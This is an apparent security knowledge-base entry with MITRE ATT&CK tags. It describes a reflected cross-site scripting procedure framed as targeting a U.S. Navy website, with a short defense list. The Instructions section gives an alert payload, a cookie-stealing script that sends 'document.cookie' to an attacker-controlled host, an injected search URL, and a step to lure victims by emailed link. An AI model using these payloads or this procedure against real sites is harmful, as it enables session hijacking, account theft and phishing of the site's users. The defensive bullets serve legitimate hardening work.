---
tags:
  - xss
  - reflected-xss
  - javascript
  - web-vulnerability
  - session-theft
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: edace609-4c5b-435f-9b3b-a469ad40b9db
created_at: '2025-12-14T03:16:30.998Z'
updated_at: '2025-12-14T03:16:30.998Z'
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Demonstrate-Reflected-XSS-via-Malicious-URL

## Summary

This procedure demonstrates a reflected cross-site scripting (XSS) attack by crafting a malicious URL that injects JavaScript into a vulnerable web application's response, allowing execution of arbitrary code in the user's browser to steal session data or alter content.

## Description

Reflected XSS occurs when user input is inadequately sanitized and reflected back in the server's response without encoding, enabling attackers to inject scripts. In this scenario, targeting a U.S. Navy website, an attacker crafts a URL with a malicious payload in a parameter (e.g., search query). When a victim accesses the URL, the browser interprets the injected script as part of the legitimate page, executing it in the site's context. This can lead to session hijacking by exfiltrating cookies or defacing the page. The attack relies on social engineering to lure victims to the malicious link and assumes no client-side protections like Content Security Policy (CSP).

## Requirements

1. Access to a web browser with developer tools (e.g., Chrome DevTools for inspecting network requests)
2. Knowledge of the target website's URL and a vulnerable input parameter (e.g., search or redirect)
3. An attacker-controlled server for data exfiltration (optional, for real-world impact testing)

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding (e.g., HTML-encode user inputs)
- Deploy Content Security Policy (CSP) headers to restrict script execution
- Use Web Application Firewall (WAF) rules to block common XSS payloads
- Monitor for anomalous JavaScript execution or unexpected network requests from web pages

## Objectives

1. Inject and execute malicious JavaScript in the victim's browser
2. Exfiltrate sensitive data like session cookies
3. Demonstrate potential for content modification or phishing escalation

## Instructions

### Step 1: Identify Vulnerable Parameter

**Context**: Examine the target website to find a reflected input point, such as a search field or error message that echoes user input.

Navigate to the Navy website and test parameters by appending simple payloads like `?q=test<`. If `<` appears unencoded in the response, it's likely vulnerable.

### Step 2: Craft Malicious Payload

**Context**: Build a JavaScript payload to test execution and exfiltration.

Use a basic payload for proof-of-concept:

```
<script>alert('XSS Demonstrated')</script>
```

For session theft:

```
<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>
```

### Step 3: Construct and Test Malicious URL

**Context**: Combine the payload with the target endpoint and verify execution.

Example URL (replace with actual site):

```
https://navy-site.example.com/search?q=<script>alert(document.cookie)</script>
```

Open the URL in a browser. Check the console or network tab for execution.

### Step 4: Simulate Victim Interaction

**Context**: In a real attack, send the URL via email or link; here, test by clicking it yourself in an incognito session.

Observe the alert or redirection confirming success.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
- [[JavaScript]]
- [[web-vulnerability]]
- [[session-theft]]
